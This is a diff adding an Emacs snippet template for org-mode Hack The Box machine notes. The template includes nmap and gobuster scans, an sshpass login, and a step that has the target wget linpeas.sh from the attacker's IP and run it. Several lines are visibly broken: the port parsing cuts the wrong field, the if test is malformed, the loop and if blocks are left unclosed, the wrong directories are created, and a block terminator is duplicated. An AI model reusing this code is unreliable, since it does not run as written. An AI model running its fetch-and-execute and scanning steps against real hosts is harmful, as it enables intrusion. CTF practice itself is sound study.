@@ -1,0 +1,146 @@
+# -*- mode: snippet -*-
+# name: Hack The Box Full
+# uuid:
+# key: trigger-key
+# condition: t
+# --
+
+* Hack The Box: ${1:Name Of the Box}
+** Notes
++ Machine ip: ${2:Host IP}
++ Our IP: ${3:attacker ip} ***REMOVE THIS BEFORE PUBLISH***
+** Setup
+I Need to create our working dir.
+#+begin_src shell :async :results output replace
+work_dir=\$(pwd)
+if [ -d \$work_dir/scans ]; then
+    echo "Scan dir  already Created, we can save scans now"
+else
+    mkdir -vp \$work_dir/scans
+fi
+if [ -d \$work_dir/files ]; then
+    echo "files dir already Created, we can save found files now"
+else
+    mkdir -vp \$work_dir/files
+fi
+
+if [ -d \$work_dir/exploits ]; then
+    echo "exploit dir already Created"
+else
+    mkdir -vp \$work_dir/exploit
+fi
+
+if [ -d \$work_dir/images ]; then
+    echo "image dir already Created"
+else
+    mkdir -vp \$work_dir/files
+fi
+
+#+end_src
+
+We need to create some quick scripts
+perl script to find all open http ports.[fn:1]
+#+begin_src perl :tangle scripts/http_ports.pl
+#!/usr/bin/perl
+use strict;
+
+while(<>) {
+  next unless m/^Host: ([0-9.]+) .* Ports: (.*)(?:\s+Ignored.*)?/;
+  # $1 and $2 are the values from the capture groups in the previous regex
+  my (\$ip, \$ports) = (\$1, \$2);
+
+  # split $ports into array @ports
+  my @ports = split /,\s+/, \$ports;
+
+  # iterate over the array and output the IP and port number only when http appears
+  foreach (@ports) {
+    next unless s=^(\d+)\/.*http.*=$1=;
+    printf "%s:%s\n", \$ip, \$_;
+  };
+}
+#+end_src
+exctract ssh ports
+#+begin_src  perl :tangle scripts/ssh_ports.pl
+#!/usr/bin/perl
+use strict;
+
+while(<>) {
+  next unless m/^Host: ([0-9.]+) .* Ports: (.*)(?:\s+Ignored.*)?/;
+  # $1 and $2 are the values from the capture groups in the previous regex
+  my (\$ip, \$ports) = (\$1, \$2);
+
+  # split $ports into array @ports
+  my @ports = split /,\s+/, \$ports;
+
+  # iterate over the array and output the IP and port number only when ssh appears
+  foreach (@ports) {
+    next unless s=^(\d+)\/.*ssh.*=$1=;
+    printf "%s:%s\n", \$ip, \$_;
+  };
+}
+#+end_src
+#+end_src
+change file permission
+#+begin_src shell :async
+chmod +x scripts/http_ports.pl
+chmod +x scripts/ssh_ports.pl
+#+end_src
+** Scans and tests
+In this section you find tool output
+*** Nmap Scan for host $2
+
+#+begin_src shell :async  :results output replace
+nmap $2 -A -oA scans/$2_nmap
+#+end_src
+
+#+RESULTS:
+*** GoBuster on host $2
+#+begin_src shell :async :results output replace
+open_http_ports=\$(./scripts/http_ports.pl  scans/$2_nmap.gnmap)
+for line in \$open_http_ports;do
+    ip=\$(echo \$line | cut -d ":" -f 1)
+    port=\$(echo \$line | cut -d ":" -f 1)
+    if [ -e "$port" "443"]; then
+        echo "Dirbust on \$ip:\$port"
+        gobuster dir -w  ~/wordlists/Discovery/Web-Content/big.txt --url https://\$ip:\$port
+    else
+        echo "Dirbust on \$ip:\$port"
+        gobuster dir -w  ~/wordlists/Discovery/Web-Content/big.txt --url http://\$ip:\$port
+#+end_src
+
+** Foot hold
+in this section we remote into the machine and attempt to gain root :)
+*NOTE* You might have to change how you remote in based on the box. Look at org-sessions to maintain a connection. in this org-file I assume you have ssh access
+*** SSH login
+I use sshpass to type in the password into the tty for us. Yes i know this is insecure so fuckoff before you claim this is a bad idea.
+
+We also will cat out the user flag so we can submit it
+#+begin_src shell :session *ssh user@$2* :var password="user_password" :async :results output replace
+# I dont want to hear OMG YOUR USING SSHPASS SO INSECURE REEEEEE
+sshpass -p \$password user@$2
+cat user.txt
+#+end_src
+*** Linpeas
+Linpeas is Most Likly Not on the host so lets copy it over with python http.server
+Here We are starting the http server to copy the file over
+#+begin_src shell :async :results silent :dir /path/to/dir/with/linpeas
+python -m "http.server"
+#+end_src
+
+I create my working TMP dir so I can save files. You should change the name to somthing not interesting to keep people from cheating
+#+begin_src shell :session *ssh user@$2* :results output replace :dir /tmp :async
+our_dir=\$(unseen_tmp_stay_out_you_cheater)
+mkdir \$our_dir
+#+end_src
+
+I download Linpeas.sh from my machine and execute the script
+#+begin_src shell :session *ssh user@$2* :var ip="$3" :async :results output replace
+wget $3/linpeas.sh
+chmod +x \$our_dir/linpeas.sh
+./linpeas.sh
+#+end_src
+** Walkthough
+
+* FootNotes
+
+[fn:1] https://unix.stackexchange.com/questions/657946/how-to-grep-nmap-output
